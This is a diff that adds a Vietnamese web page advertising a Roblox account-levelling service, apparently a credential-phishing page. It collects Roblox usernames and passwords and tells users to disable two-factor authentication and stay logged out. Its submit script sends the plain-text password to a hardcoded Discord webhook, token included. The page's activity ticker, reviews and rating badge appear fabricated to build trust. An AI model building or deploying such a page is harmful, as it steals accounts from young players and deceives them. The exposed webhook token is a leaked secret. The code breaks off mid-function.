@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="vi" class="h-full bg-slate-100">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>RBX Boost Pro - Dịch Vụ Cày Thuê Roblox Uy Tín</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            50: '#eff6ff',
+                            100: '#dbeafe',
+                            500: '#3b82f6',
+                            600: '#2563eb',
+                            700: '#1d4ed8',
+                            900: '#1e3a8a',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .transition-smooth {
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-fade-in {
+            animation: fadeIn 0.25s ease-out forwards;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.85); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .animate-pop-in {
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+        /* Ticker Animation */
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        .animate-ticker {
+            display: flex;
+            width: 200%;
+            animation: ticker 25s linear infinite;
+        }
+        .animate-ticker:hover {
+            animation-play-state: paused;
+        }
+        /* Mobile touch optimization */
+        button, input, select, textarea {
+            -webkit-tap-highlight-color: transparent;
+        }
+    </style>
+</head>
+<body class="h-full text-slate-800 flex flex-col justify-between font-sans antialiased selection:bg-blue-600 selection:text-white">
+
+    <!-- Header -->
+    <header class="w-full border-b border-slate-200/80 bg-white/95 backdrop-blur-md sticky top-0 z-50 shadow-xs">
+        <div class="max-w-4xl mx-auto px-3.5 sm:px-4 h-16 flex items-center justify-between">
+            <!-- Custom Roblox Logo with Image -->
+            <div class="flex items-center space-x-2.5 sm:space-x-3 cursor-pointer group" onclick="switchTab('booking')">
+                <div class="relative w-10 h-10 rounded-md overflow-hidden bg-slate-900 flex items-center justify-center shadow-xs group-hover:scale-105 transition-smooth border border-slate-200">
+                    <img 
+                        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7lo5NOQwMJBmOjegYRtruWWBpfjr8OchRm3PktzDg3G5rgdyNat6J_10&s=10" 
+                        alt="Roblox Logo" 
+                        class="w-full h-full object-cover"
+                        onerror="this.onerror=null; this.src='https://placehold.co/40x40/0f172a/ffffff?text=RBX';"
+                    >
+                    <span class="absolute -top-0.5 -right-0.5 flex h-2.5 w-2.5 z-10">
+                      <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                      <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                    </span>
+                </div>
+                <div class="flex flex-col">
+                    <span class="font-extrabold tracking-tight text-base sm:text-lg text-slate-900 flex items-center gap-1">
+                        ROBLOX<span class="text-blue-600">BOOST</span>
+                    </span>
+                    <span class="text-[10px] uppercase tracking-wider text-slate-400 font-bold -mt-1">Dịch Vụ Roblox Số 1</span>
+                </div>
+            </div>
+
+            <div class="flex items-center space-x-1.5 sm:space-x-2">
+                <button onclick="switchTab('booking')" id="navBookingBtn" class="px-2.5 sm:px-3 py-1.5 text-xs font-semibold rounded-md bg-blue-50 text-blue-700 transition-smooth flex items-center gap-1.5">
+                    <i class="fa-solid fa-gamepad"></i>
+                    <span>Đặt Cày</span>
+                </button>
+                <button onclick="switchTab('tracking')" id="navTrackingBtn" class="px-2.5 sm:px-3 py-1.5 text-xs font-medium rounded-md text-slate-600 hover:bg-slate-100 transition-smooth flex items-center gap-1.5">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                    <span>Tra Cứu</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Live Activity Ticker -->
+    <div class="bg-slate-900 text-white text-[11px] py-1.5 overflow-hidden border-b border-slate-800">
+        <div class="max-w-4xl mx-auto flex items-center px-3.5 sm:px-4">
+            <span class="bg-blue-600 text-white text-[9px] font-bold px-1.5 py-0.5 rounded-xs uppercase mr-2.5 whitespace-nowrap">Vừa Xong</span>
+            <div class="overflow-hidden relative w-full">
+                <div class="animate-ticker whitespace-nowrap flex space-x-8 text-slate-300">
+                    <span>⚡ Gamer_Pro99 - Blox Fruits: Cày Level 2450 (Hoàn thành)</span>
+                    <span>🔥 MinhKien_RBX - Blox Fruits: Lấy Tushita (Hoàn thành)</span>
+                    <span>🛡️ DragonKing_01 - King Legacy: Săn Sea Beast (Hoàn thành)</span>
+                    <span>⚡ Gamer_Pro99 - Blox Fruits: Cày Level 2450 (Hoàn thành)</span>
+                    <span>🔥 MinhKien_RBX - Blox Fruits: Lấy Tushita (Hoàn thành)</span>
+                    <span>🛡️ DragonKing_01 - King Legacy: Săn Sea Beast (Hoàn thành)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content Area -->
+    <main class="max-w-3xl mx-auto px-3 sm:px-4 py-5 sm:py-8 flex-grow w-full space-y-8">
+
+        <!-- Custom Promotional Banner -->
+        <div class="w-full rounded-md overflow-hidden border border-slate-200/90 shadow-xs bg-slate-900 group relative">
+            <img 
+                src="https://i.ibb.co/XxfJDnb2/1-20261013-200338-0000.png" 
+                alt="RBX Boost Banner" 
+                class="w-full h-auto max-h-56 sm:max-h-72 object-cover block group-hover:scale-[1.01] transition-smooth"
+                onerror="this.onerror=null; this.parentElement.style.display='none';"
+            >
+        </div>
+
+        <!-- Tab 1: Roblox Order Form -->
+        <div id="bookingTab" class="space-y-5 animate-fade-in">
+            
+            <!-- Hero Heading -->
+            <div class="text-center space-y-1.5">
+                <div class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-blue-50 border border-blue-200 text-blue-700 text-xs font-semibold mb-1">
+                    <i class="fa-solid fa-bolt text-blue-600"></i> Cam Kết Hoàn Thành Tối Đa Trong 24H
+                </div>
+                <h1 class="text-2xl sm:text-3xl font-extrabold tracking-tight text-slate-900">
+                    Cày Thuê Roblox Tự Động & Uy Tín
+                </h1>
+                <p class="text-slate-500 text-xs sm:text-sm max-w-md mx-auto">
+                    Hệ thống tiếp nhận đơn hàng cày thuê Blox Fruits, King Legacy, Pet Simulator 99 và nhiều game Roblox khác.
+                </p>
+            </div>
+
+            <!-- Important Warning Box -->
+            <div class="bg-amber-50/90 border border-amber-200/90 rounded-md p-3.5 sm:p-4 text-xs text-amber-950 space-y-2 shadow-2xs">
+                <div class="flex items-center space-x-2 font-bold text-amber-900">
+                    <i class="fa-solid fa-triangle-exclamation text-amber-600 text-sm"></i>
+                    <span class="uppercase tracking-wide text-[11px] sm:text-xs">LƯU Ý BẮT BUỘC KHI TẠO ĐƠN</span>
+                </div>
+                <ul class="list-disc pl-4 space-y-1 text-amber-900/90 leading-relaxed font-medium">
+                    <li><strong>Tắt xác minh 2 bước (2FA / Authenticator / Email Pin)</strong> trước khi gửi tài khoản.</li>
+                    <li>Thời gian duyệt & cày hoàn thành từ <strong>12H - 3 Ngày</strong> (tùy gói dịch vụ bạn chọn, cam kết xử lý cực nhanh).</li>
+                    <li><strong>Tuyệt đối không đăng nhập vào acc Roblox</strong> khi đơn đang trong trạng thái xử lý. Vi phạm sẽ bị <strong>hủy đơn ngay lập tức (không hoàn tiền)</strong>.</li>
+                </ul>
+            </div>
+
+            <!-- Main Order Form Card -->
+            <div class="bg-white border border-slate-200/90 rounded-md p-4 sm:p-7 shadow-xs relative">
+                
+                <form id="boostForm" onsubmit="handleSubmit(event)" class="space-y-4">
+                    
+                    <!-- Roblox Sub-game Selection Quick Chips -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">
+                            1. Chọn Tựa Game Roblox
+                        </label>
+                        <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                            <button type="button" onclick="selectSubGame('blox_fruits')" id="game_blox_fruits" class="subgame-btn border-2 border-blue-600 bg-blue-50/50 text-blue-900 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between">
+                                <span class="font-bold text-xs flex items-center gap-1">
+                                    <i class="fa-solid fa-dragon text-blue-600"></i> Blox Fruits
+                                </span>
+                                <span class="text-[10px] text-slate-500 mt-1">Level, Beli, Mastery</span>
+                            </button>
+                            <button type="button" onclick="selectSubGame('king_legacy')" id="game_king_legacy" class="subgame-btn border border-slate-200 bg-slate-50 text-slate-700 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between hover:border-slate-300">
+                                <span class="font-bold text-xs flex items-center gap-1">
+                                    <i class="fa-solid fa-crown text-slate-500"></i> King Legacy
+                                </span>
+                                <span class="text-[10px] text-slate-500 mt-1">Level, Gem, Kiếm</span>
+                            </button>
+                            <button type="button" onclick="selectSubGame('pet_sim')" id="game_pet_sim" class="subgame-btn border border-slate-200 bg-slate-50 text-slate-700 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between hover:border-slate-300">
+                                <span class="font-bold text-xs flex items-center gap-1">
+                                    <i class="fa-solid fa-cat text-slate-500"></i> Pet Sim 99
+                                </span>
+                                <span class="text-[10px] text-slate-500 mt-1">Diamonds, Rebirth</span>
+                            </button>
+                            <button type="button" onclick="selectSubGame('roblox_other')" id="game_roblox_other" class="subgame-btn border border-slate-200 bg-slate-50 text-slate-700 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between hover:border-slate-300">
+                                <span class="font-bold text-xs flex items-center gap-1">
+                                    <i class="fa-solid fa-cubes text-slate-500"></i> Game Khác
+                                </span>
+                                <span class="text-[10px] text-slate-500 mt-1">Yêu cầu tự chọn</span>
+                            </button>
+                        </div>
+                        <input type="hidden" id="selectedSubGame" value="Blox Fruits">
+                    </div>
+
+                    <!-- Credentials Inputs -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" for="username">
+                                2. Tên Tài Khoản Roblox (Username)
+                            </label>
+                            <div class="relative">
+                                <span class="absolute left-3 top-2.5 text-slate-400 text-xs"><i class="fa-solid fa-user"></i></span>
+                                <input 
+                                    type="text" 
+                                    id="username" 
+                                    required 
+                                    placeholder="Tên đăng nhập Roblox" 
+                                    class="w-full bg-slate-50 border border-slate-200 rounded-md pl-8 pr-3.5 py-2 text-xs sm:text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:bg-white transition-smooth"
+                                >
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" for="password">
+                                Mật Khẩu Roblox (Password)
+                            </label>
+                            <div class="relative">
+                                <span class="absolute left-3 top-2.5 text-slate-400 text-xs"><i class="fa-solid fa-key"></i></span>
+                                <input 
+                                    type="password" 
+                                    id="password" 
+                                    required 
+                                    placeholder="Mật khẩu tài khoản" 
+                                    class="w-full bg-slate-50 border border-slate-200 rounded-md pl-8 pr-10 py-2 text-xs sm:text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:bg-white transition-smooth"
+                                >
+                                <button type="button" onclick="togglePassword()" class="absolute right-3 top-2.5 text-slate-400 hover:text-slate-600 text-xs">
+                                    <i id="eyeIcon" class="fa-regular fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Service Package Selection -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" for="servicePackage">
+                            3. Gói Tốc Độ & Thời Gian Xử Lý
+                        </label>
+                        <select id="servicePackage" class="w-full bg-slate-50 border border-slate-200 rounded-md px-3 py-2 text-xs sm:text-sm text-slate-800 focus:outline-none focus:border-blue-500 focus:bg-white transition-smooth">
+                            <option value="Gói Siêu Tốc (Cam kết xong trong 24H)">⚡ Gói Siêu Tốc (Cam kết hoàn thành trong 24H)</option>
+                            <option value="Gói Tiêu Chuẩn (Xử lý từ 24H - 48H)">🛡️ Gói Tiêu Chuẩn (Xử lý từ 24H - 48H)</option>
+                            <option value="Gói Chuyên Sâu (Duyệt & cày 1 - 3 Ngày)">💎 Gói Chuyên Sâu (Cày level lớn 1 - 3 Ngày)</option>
+                        </select>
+                    </div>
+
+                    <!-- Detail Note Box -->
+                    <div>
+                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5" for="serviceNote">
+                            4. Ghi Chú Yêu Cầu Cày Chi Tiết
+                        </label>
+                        <textarea 
+                            id="serviceNote" 
+                            rows="3" 
+                            required 
+                            placeholder="Nhập chi tiết: Cày level bao nhiêu, săn trái quỷ gì, hoặc farm Beli / xương / fragment..." 
+                            class="w-full bg-slate-50 border border-slate-200 rounded-md px-3.5 py-2 text-xs sm:text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500 focus:bg-white transition-smooth resize-none"
+                        ></textarea>
+                    </div>
+
+                    <!-- Checkbox Terms -->
+                    <div class="flex items-start space-x-2 pt-1">
+                        <input type="checkbox" id="agreeTerm" required class="mt-0.5 w-4 h-4 text-blue-600 border-slate-300 rounded focus:ring-blue-500">
+                        <label for="agreeTerm" class="text-xs text-slate-600 leading-tight">
+                            Tôi đã <strong>tắt 2FA</strong> và cam kết không vào tài khoản Roblox khi đang cày.
+                        </label>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button 
+                        type="submit" 
+                        id="submitBtn"
+                        class="w-full bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white font-bold py-2.5 px-4 rounded-md text-xs sm:text-sm transition-smooth flex items-center justify-center space-x-2 shadow-xs cursor-pointer"
+                    >
+                        <span>GỬI YÊU CẦU CÀY THUÊ ROBLOX</span>
+                        <i class="fa-solid fa-arrow-right text-xs"></i>
+                    </button>
+                </form>
+
+                <!-- Success Overlay -->
+                <div id="successOverlay" class="absolute inset-0 bg-white/98 backdrop-blur-xs rounded-md flex flex-col items-center justify-center p-6 text-center hidden animate-fade-in z-20">
+                    <div class="w-12 h-12 rounded-full bg-emerald-50 border border-emerald-200 flex items-center justify-center mb-3 animate-pop-in">
+                        <i class="fa-solid fa-check text-xl text-emerald-600"></i>
+                    </div>
+                    <h3 class="text-base font-bold text-slate-900 mb-1">Đã Tiếp Nhận Đơn Roblox!</h3>
+                    <p class="text-xs text-slate-500 max-w-xs mb-2">
+                        Mã đơn của bạn: <strong id="generatedOrderId" class="text-blue-600 font-mono">#RBX-99482</strong>
+                    </p>
+                    <div class="bg-slate-50 border border-slate-200/80 rounded-md p-3 mb-4 text-xs text-slate-600 max-w-xs text-left space-y-1">
+                        <p><i class="fa-solid fa-shield-halved text-emerald-600 mr-1"></i> Cam kết bảo mật 100%</p>
+                        <p><i class="fa-solid fa-clock text-blue-600 mr-1"></i> Xử lý xong tối đa trong 24H</p>
+                    </div>
+                    <div class="flex space-x-2">
+                        <button 
+                            onclick="resetForm()" 
+                            class="bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-semibold py-2 px-3.5 rounded-md transition-smooth"
+                        >
+                            Tạo Đơn Khác
+                        </button>
+                        <button 
+                            onclick="switchTab('tracking')" 
+                            class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold py-2 px-3.5 rounded-md transition-smooth"
+                        >
+                            Tra Cứu Đơn
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Tab 2: Order Tracking -->
+        <div id="trackingTab" class="space-y-5 hidden animate-fade-in">
+            <div class="text-center space-y-1.5">
+                <h1 class="text-2xl sm:text-3xl font-extrabold tracking-tight text-slate-900">
+                    Tra Cứu Tiến Độ Đơn Roblox
+                </h1>
+                <p class="text-slate-500 text-xs sm:text-sm max-w-md mx-auto">
+                    Nhập mã đơn (#RBX-xxxxx) hoặc Tên tài khoản Roblox để kiểm tra trạng thái thực tế.
+                </p>
+            </div>
+
+            <div class="bg-white border border-slate-200/90 rounded-md p-4 sm:p-7 shadow-xs">
+                <div class="flex space-x-2 mb-4">
+                    <input 
+                        type="text" 
+                        id="searchQuery" 
+                        placeholder="Nhập mã đơn (Ví dụ: #RBX-12345) hoặc Username..." 
+                        class="flex-grow bg-slate-50 border border-slate-200 rounded-md px-3.5 py-2 text-xs sm:text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500"
+                    >
+                    <button onclick="searchOrder()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs sm:text-sm font-semibold px-4 py-2 rounded-md transition-smooth">
+                        Tra Cứu
+                    </button>
+                </div>
+
+                <!-- Search Result Card -->
+                <div id="searchResult" class="hidden border border-slate-200 rounded-md p-4 bg-slate-50 space-y-3 animate-fade-in">
+                    <div class="flex justify-between items-center border-b border-slate-200 pb-2">
+                        <span class="text-xs font-bold text-slate-700">Mã Đơn: <span id="resCode" class="text-blue-600 font-mono">#RBX-99482</span></span>
+                        <span class="text-[11px] font-semibold px-2.5 py-0.5 rounded-md bg-amber-100 text-amber-800" id="resStatus">Đã tiếp nhận - Chờ duyệt</span>
+                    </div>
+                    <div class="text-xs text-slate-600 space-y-1.5">
+                        <p><strong>Game:</strong> <span id="resGame" class="text-slate-800 font-medium">Blox Fruits</span></p>
+                        <p><strong>Tài khoản:</strong> <span id="resUser" class="text-slate-800 font-medium">Roblox_Player</span></p>
+                        <p><strong>Gói tốc độ:</strong> <span id="resPkg" class="text-slate-800 font-medium">Gói Siêu Tốc (24H)</span></p>
+                        <p><strong>Yêu cầu cày:</strong> <span id="resNoteContent" class="text-slate-800 font-medium">Cày Level 1 đến 2450</span></p>
+                        <p><strong>Thời gian tạo:</strong> <span id="resTime" class="text-slate-500">Vừa xong</span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Big Update Feature: Realistic Gamer Comments & Feedback Section -->
+        <section class="bg-white border border-slate-200/90 rounded-md p-4 sm:p-7 shadow-xs space-y-5">
+            <!-- Header -->
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-100 pb-4">
+                <div>
+                    <h2 class="text-lg sm:text-xl font-extrabold text-slate-900 flex items-center gap-2">
+                        <i class="fa-solid fa-comments text-blue-600"></i>
+                        Đánh Giá & Bình Luận Khách Hàng
+                    </h2>
+                    <p class="text-xs text-slate-500 mt-0.5">Phản hồi thực tế từ các game thủ đã cày thuê tại RBX Boost Pro</p>
+                </div>
+                <!-- Stat badge -->
+                <div class="flex items-center space-x-2 bg-blue-50 border border-blue-100 px-3 py-1.5 rounded-md self-start sm:self-auto">
+                    <div class="flex text-amber-400 text-xs">
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                    </div>
+                    <span class="text-xs font-bold text-slate-800">4.9/5</span>
+                    <span class="text-[11px] text-slate-400 font-medium">(1,420+ đơn)</span>
+                </div>
+            </div>
+
+            <!-- Add Comment Input Form -->
+            <form onsubmit="postComment(event)" class="bg-slate-50 border border-slate-200/80 rounded-md p-3.5 space-y-3">
+                <span class="text-xs font-bold text-slate-700 block">Viết bình luận của bạn</span>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
+                    <input 
+                        type="text" 
+                        id="commentName" 
+                        required 
+                        placeholder="Tên hoặc Biệt danh Roblox (VD: MinhKien_2009)..." 
+                        class="bg-white border border-slate-200 rounded-md px-3 py-1.5 text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500"
+                    >
+                    <select id="commentRating" class="bg-white border border-slate-200 rounded-md px-3 py-1.5 text-xs text-slate-800 focus:outline-none focus:border-blue-500">
+                        <option value="5">⭐⭐⭐⭐⭐ (5/5 - Rất hài lòng)</option>
+                        <option value="4">⭐⭐⭐⭐ (4/5 - Tốt)</option>
+                        <option value="3">⭐⭐⭐ (3/3 - Bình thường)</option>
+                    </select>
+                </div>
+                <div class="flex space-x-2">
+                    <input 
+                        type="text" 
+                        id="commentText" 
+                        required 
+                        placeholder="Nhập cảm nhận sau khi cày..." 
+                        class="flex-grow bg-white border border-slate-200 rounded-md px-3 py-1.5 text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:border-blue-500"
+                    >
+                    <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold px-4 py-1.5 rounded-md transition-smooth whitespace-nowrap">
+                        Gửi
+                    </button>
+                </div>
+            </form>
+
+            <!-- Realistic Gamer Comments List -->
+            <div id="commentsContainer" class="space-y-3.5 divide-y divide-slate-100">
+                
+                <!-- Comment 1 -->
+                <div class="pt-3.5 first:pt-0 space-y-1.5">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-7 h-7 rounded-full bg-slate-800 text-white flex items-center justify-center font-bold text-xs uppercase">
+                                K
+                            </div>
+                            <div>
+                                <span class="font-bold text-xs text-slate-800">KhoaPro_Blox2008</span>
+                                <span class="ml-1.5 text-[10px] font-semibold text-emerald-700 bg-emerald-50 border border-emerald-200 px-1.5 py-0.2 rounded-xs">Đã mua gói Siêu Tốc</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">10 phút trước</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed pl-9">
+                        Cày Max Level Blox Fruits quá nhanh anh ơi, nãy gửi từ sáng chiều về check acc xong cmnr. Uy tín vcl 100/10 điểm ⭐⭐⭐⭐⭐
+                    </p>
+                </div>
+
+                <!-- Comment 2 -->
+                <div class="pt-3.5 space-y-1.5">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-7 h-7 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-xs uppercase">
+                                B
+                            </div>
+                            <div>
+                                <span class="font-bold text-xs text-slate-800">Bảo_SănTráiMochi</span>
+                                <span class="ml-1.5 text-[10px] font-semibold text-emerald-700 bg-emerald-50 border border-emerald-200 px-1.5 py-0.2 rounded-xs">Đã mua Blox Fruits</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">32 phút trước</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed pl-9">
+                        Đã cày lấy kiếm CDK + nâng V4 thành công. Acc còn nguyên không mất tí gì, shop uy tín không như mấy bên scam trên TikTok nha anh em!
+                    </p>
+                </div>
+
+                <!-- Comment 3 -->
+                <div class="pt-3.5 space-y-1.5">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-7 h-7 rounded-full bg-indigo-600 text-white flex items-center justify-center font-bold text-xs uppercase">
+                                H
+                            </div>
+                            <div>
+                                <span class="font-bold text-xs text-slate-800">Hoang_KingLegacy99</span>
+                                <span class="ml-1.5 text-[10px] font-semibold text-blue-700 bg-blue-50 border border-blue-200 px-1.5 py-0.2 rounded-xs">Đã mua King Legacy</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">2 giờ trước</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed pl-9">
+                        Săn hộ 50 Gem vs cày max level siêu mượt. Nhớ tắt 2FA nhé mấy ông không bị duyệt lâu đấy. Tks admin!
+                    </p>
+                </div>
+
+                <!-- Comment 4 -->
+                <div class="pt-3.5 space-y-1.5">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-2">
+                            <div class="w-7 h-7 rounded-full bg-amber-600 text-white flex items-center justify-center font-bold text-xs uppercase">
+                                T
+                            </div>
+                            <div>
+                                <span class="font-bold text-xs text-slate-800">Tuan_RobloxGamer</span>
+                                <span class="ml-1.5 text-[10px] font-semibold text-emerald-700 bg-emerald-50 border border-emerald-200 px-1.5 py-0.2 rounded-xs">Đã mua Pet Sim 99</span>
+                            </div>
+                        </div>
+                        <span class="text-[11px] text-slate-400">4 giờ trước</span>
+                    </div>
+                    <p class="text-xs text-slate-600 leading-relaxed pl-9">
+                        Farm Beli + cày Level lẹ khủng khủng. Sẽ ủng hộ shop dài dài!
+                    </p>
+                </div>
+
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="w-full border-t border-slate-200 py-4 text-center text-xs text-slate-500 bg-white">
+        <p>&copy; 2026 RBX BOOST PRO. Bảo Mật Tuyệt Đối - Cày Nhanh Trong 24H.</p>
+    </footer>
+
+    <!-- JavaScript Application Logic -->
+    <script>
+        // Subgame button selection logic
+        function selectSubGame(gameKey) {
+            const buttons = document.querySelectorAll('.subgame-btn');
+            buttons.forEach(btn => {
+                btn.className = "subgame-btn border border-slate-200 bg-slate-50 text-slate-700 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between hover:border-slate-300";
+            });
+
+            const activeBtn = document.getElementById('game_' + gameKey);
+            activeBtn.className = "subgame-btn border-2 border-blue-600 bg-blue-50/50 text-blue-900 p-2.5 rounded-md text-left transition-smooth flex flex-col justify-between";
+
+            const gameNames = {
+                'blox_fruits': 'Blox Fruits',
+                'king_legacy': 'King Legacy',
+                'pet_sim': 'Pet Simulator 99',
+                'roblox_other': 'Game Roblox Khác'
+            };
+            document.getElementById('selectedSubGame').value = gameNames[gameKey] || 'Blox Fruits';
+        }
+
+        // Tab switching logic
+        function switchTab(tab) {
+            const bookingTab = document.getElementById('bookingTab');
+            const trackingTab = document.getElementById('trackingTab');
+            const navBookingBtn = document.getElementById('navBookingBtn');
+            const navTrackingBtn = document.getElementById('navTrackingBtn');
+
+            if (tab === 'booking') {
+                bookingTab.classList.remove('hidden');
+                trackingTab.classList.add('hidden');
+                navBookingBtn.className = "px-2.5 sm:px-3 py-1.5 text-xs font-semibold rounded-md bg-blue-50 text-blue-700 transition-smooth flex items-center gap-1.5";
+                navTrackingBtn.className = "px-2.5 sm:px-3 py-1.5 text-xs font-medium rounded-md text-slate-600 hover:bg-slate-100 transition-smooth flex items-center gap-1.5";
+            } else {
+                trackingTab.classList.remove('hidden');
+                bookingTab.classList.add('hidden');
+                navTrackingBtn.className = "px-2.5 sm:px-3 py-1.5 text-xs font-semibold rounded-md bg-blue-50 text-blue-700 transition-smooth flex items-center gap-1.5";
+                navBookingBtn.className = "px-2.5 sm:px-3 py-1.5 text-xs font-medium rounded-md text-slate-600 hover:bg-slate-100 transition-smooth flex items-center gap-1.5";
+            }
+        }
+
+        // Toggle password visibility
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            }
+        }
+
+        // Handle form submission and Discord Webhook delivery
+        async function handleSubmit(event) {
+            event.preventDefault();
+
+            const subGame = document.getElementById('selectedSubGame').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const servicePackage = document.getElementById('servicePackage').value;
+            const serviceNote = document.getElementById('serviceNote').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+
+            const orderId = '#RBX-' + Math.floor(10000 + Math.random() * 90000);
+            document.getElementById('generatedOrderId').innerText = orderId;
+
+            // Loading state
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fa-solid fa-circle-notch animate-spin text-xs"></i> <span>Đang Gửi Đơn Cày...</span>';
+
+            const webhookUrl = "https://discord.com/api/webhooks/1559541356685172778/BYYNxzl7pL72Un1WEBo8JLqpXAXTXA0xNhazql93ycMpuatdCCf0wHqC-fkJQSZuEoGS";
+
+            const payload = {
+                content: "@everyone **🎮 CÓ ĐƠN CÀY THUÊ ROBLOX MỚI!**",
+                embeds: [{
+                    title: `⚔️ ĐƠN ROBLOX MỚI ${orderId}`,
+                    color: 2555634, // Blue color
+                    fields: [
+                        { name: "📌 Mã Đơn", value: `\`${orderId}\``, inline: true },
+                        { name: "🎮 Game Roblox", value: `\`${subGame}\``, inline: true },
+                        { name: "⏱️ Tốc Độ", value: `\`${servicePackage}\``, inline: false },
+                        { name: "👤 Tài Khoản Roblox", value: `\`\`\`${username}\`\`\``, inline: false },
+                        { name: "🔑 Mật Khẩu", value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: "📝 Yêu Cầu Chi Tiết", value: `\`\`\`${serviceNote}\`\`\``, inline: false },
+                        { name: "✅ Cam Kết 2FA", value: "Khách đã xác nhận TẮT 2FA", inline: true }
+                    ],
+                    footer: { text: "RBX Boost Pro System • Xử lý tối đa 24H" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Webhook submission error:", error);
+            }
+
+            // Restore button state
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<span>GỬI YÊU CẦU CÀY THUÊ ROBLOX</span><i class="fa-solid fa-arrow-right text-xs"></i>';
+
+            // Store in session storage for tracking
+            sessionStorage.setItem('lastRbxOrder', JSON.stringify({
+                code: orderId,
+                game: subGame,
+                user: username,
